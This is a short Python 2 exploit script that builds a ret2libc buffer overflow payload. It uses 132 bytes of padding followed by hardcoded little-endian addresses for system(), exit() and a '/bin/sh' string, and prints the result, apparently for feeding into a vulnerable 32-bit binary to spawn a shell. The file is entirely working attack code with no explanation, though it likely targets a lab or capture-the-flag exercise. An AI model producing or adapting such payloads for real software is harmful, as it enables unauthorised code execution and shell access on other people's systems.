#!/usr/bin/python
import struct
import string

padding = "A" * 132
system = struct.pack("<I", 0xf7e4e940)
exit = struct.pack("<I", 0xf7e427b0)
bin_sh = struct.pack("<I", 0xf7f6ce8b)

s = padding + system + exit + bin_sh
print s
